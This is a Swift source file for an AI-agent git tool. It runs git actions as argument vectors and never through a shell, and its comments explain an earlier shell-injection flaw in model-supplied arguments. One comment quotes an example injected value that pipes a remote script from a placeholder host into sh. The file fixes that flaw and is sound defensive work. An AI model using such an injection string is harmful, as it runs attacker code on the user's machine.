//
//  GitIntegrationTool.swift
//  Devgentic
//

import Foundation

// MARK: - Git Tool

/// Result of resolving a git action to an argument vector.
///
/// `argv`, not a command string. The previous form built `"git -C \"\(repoPath)\" diff
/// \(extraArgs)"` and handed it to `zsh -c`, with `extraArgs` interpolated UNQUOTED — so
/// `args: "; curl evil.sh | sh"` needed no quote-break at all and simply ran. `args` and
/// `path` are tool arguments supplied by the model, which means anything that can influence
/// the model could reach a shell through a tool that profiles enable precisely BECAUSE they
/// are withholding shell access.
enum GitCommandResolution {
    case argv([String])
    case error(String)
}

/// Pure logic for building git argument vectors from action + args. Extracted for testability.
enum GitCommandBuilder {

    /// Splits a shell-style argument STRING into argv words — and does nothing else.
    ///
    /// `args` is documented as free-form git arguments (`-n 5`, `--author="J Smith"`), so it
    /// genuinely needs word-splitting and quote removal. It does NOT need, and deliberately
    /// does not get, any other shell behaviour: no globbing, no `$VAR`, no `$(…)`, no
    /// operators. `;` and `|` survive tokenisation as ordinary characters and reach `git` as
    /// literal arguments, where they are rejected as unknown revisions rather than executed.
    ///
    /// A naive `split(separator: " ")` would be wrong in the other direction — it breaks
    /// `--author="J Smith"` into two arguments — which is why this is a real tokenizer and not
    /// a one-liner.
    static func tokenize(_ input: String) -> [String] {
        var tokens: [String] = []
        var current = ""
        var started = false
        var quote: Character?
        var escaped = false

        for character in input {
            if escaped {
                current.append(character); started = true; escaped = false; continue
            }
            // Inside single quotes a backslash is literal, matching shell word-splitting.
            if character == "\\" && quote != "'" {
                escaped = true; started = true; continue
            }
            if let open = quote {
                if character == open { quote = nil } else { current.append(character) }
                started = true
                continue
            }
            if character == "'" || character == "\"" {
                quote = character; started = true; continue
            }
            if character.isWhitespace {
                if started { tokens.append(current); current = ""; started = false }
                continue
            }
            current.append(character); started = true
        }
        if started { tokens.append(current) }
        return tokens
    }

    static func resolve(action: String, repoPath: String, extraArgs: String) -> GitCommandResolution {
        // `-C <path>` as two argv elements: the path is data, never part of a command string.
        let base = ["-C", repoPath]
        let extra = tokenize(extraArgs)

        switch action {
        case "status":
            return .argv(base + ["status", "--short"])
        case "log":
            return .argv(base + ["log"] + (extra.isEmpty ? ["-n", "10", "--oneline"] : extra))
        case "diff":
            return .argv(base + ["diff"] + extra)
        case "branch":
            return .argv(base + ["branch", "-a"] + extra)
        case "stash_list":
            return .argv(base + ["stash", "list"])
        case "blame":
            // Checked AFTER tokenising, so whitespace-only `args` is caught here rather than
            // reaching git as `blame` with no file and failing with a less useful message.
            guard !extra.isEmpty else {
                return .error("Error: 'args' must contain the filename for blame.")
            }
            return .argv(base + ["blame"] + extra)
        case "show":
            return .argv(base + ["show"] + (extra.isEmpty ? ["HEAD"] : extra) + ["--stat"])
        default:
            return .error("Error: Unknown git action '\(action)'. Use status/log/diff/branch/stash_list/blame/show.")
        }
    }
}

struct GitTool: DevgenticTool {
    let name = "git_tool"
    let category = "Developer & Diagnostics"
    let description = "Performs Git operations with structured output: status, log, diff, branch, stash, and blame."

    struct Arguments: Decodable, Sendable {
        let action: String
        let path: String?
        let args: String?

        private struct DynamicKey: CodingKey {
            var stringValue: String
            init?(stringValue: String) { self.stringValue = stringValue }
            var intValue: Int? { return nil }
            init?(intValue: Int) { return nil }
        }

        init(from decoder: Decoder) throws {
            let container = try decoder.container(keyedBy: DynamicKey.self)

            var foundAction: String? = nil
            for key in ["action", "command", "cmd", "op"] {
                if let codingKey = DynamicKey(stringValue: key),
                   let val = try? container.decode(String.self, forKey: codingKey) {
                    foundAction = val
                    break
                }
            }
            guard let a = foundAction else {
                throw DecodingError.dataCorrupted(DecodingError.Context(codingPath: decoder.codingPath, debugDescription: "Missing 'action'"))
            }
            self.action = a
            self.path = (try? container.decodeIfPresent(String.self, forKey: DynamicKey(stringValue: "path")!))
            self.args = (try? container.decodeIfPresent(String.self, forKey: DynamicKey(stringValue: "args")!))
        }
    }

    var parameterSchema: ToolParameters {
        return SchemaBuilder.object(
            properties: [
                ("action", "string", "Git action: 'status', 'log', 'diff', 'branch', 'stash_list', 'blame', 'show'"),
                ("path", "string", "Repository path. Required — pass the project root."),
                ("args", "string", "Additional arguments (e.g., '-n 5' for log, filename for blame)")
            ],
            required: ["action", "path"]
        )
    }

    func call(arguments: Arguments) async throws -> String {
        guard let rawPath = arguments.path, !rawPath.isEmpty else {
            return "Error: 'path' is required. Pass the project root (repository path)."
        }
        let repoPath = (rawPath as NSString).expandingTildeInPath
        guard FileManager.default.fileExists(atPath: repoPath) else {
            return "Error: path '\(repoPath)' does not exist."
        }
        let extraArgs = arguments.args ?? ""

        let resolution = GitCommandBuilder.resolve(action: arguments.action, repoPath: repoPath, extraArgs: extraArgs)
        let gitArgv: [String]
        switch resolution {
        case .argv(let argv):
            gitArgv = argv
        case .error(let msg):
            return msg
        }

        do {
            // `ProcessRunner` drains stdout and stderr CONCURRENTLY. This site read them in
            // sequence after `waitUntilExit()`, which deadlocks once either passes the ~64 KB
            // pipe buffer — and `git log` / `git diff` pass it routinely.
            //
            // Invoked DIRECTLY, never through `zsh -c`: see `GitCommandResolution`. `TERM` is
            // still forced to dumb, which is what the shell path was supplying — it keeps git
            // from emitting colour escapes into output the model has to read.
            var env = ProcessInfo.processInfo.environment
            env["TERM"] = "dumb"
            let run = try ProcessRunner.run(executable: "/usr/bin/git", arguments: gitArgv, environment: env)

            // "Error:"-prefixed so `ToolExecutionMediator.isSemanticFailure` actually classifies
            // it. The previous "Git error:" missed by ONE WORD — the sniffer tests
            // `hasPrefix("error")`, so this tool correctly detected the failure, reported it,
            // and then had it recorded as a success.
            //
            // The old condition also required non-empty stderr, so a non-zero exit with silent
            // stderr fell through to the success return — the exit code counted only when
            // stderr happened to be populated.
            guard run.succeeded else {
                let detail = run.standardError.isEmpty
                    ? (run.standardOutput.isEmpty ? "(no output on stdout or stderr)" : run.standardOutput)
                    : run.standardError
                return "Error: git \(arguments.action) failed (exit \(run.exitCode))\n\(detail)"
            }

            let maxOutput = 6000
            let output = run.standardOutput
            let result = output.count > maxOutput ? String(output.prefix(maxOutput)) + "\n...[Truncated]" : output

            return "git \(arguments.action):\n\(result)"
        } catch {
            return "Error: \(error.localizedDescription)"
        }
    }
}
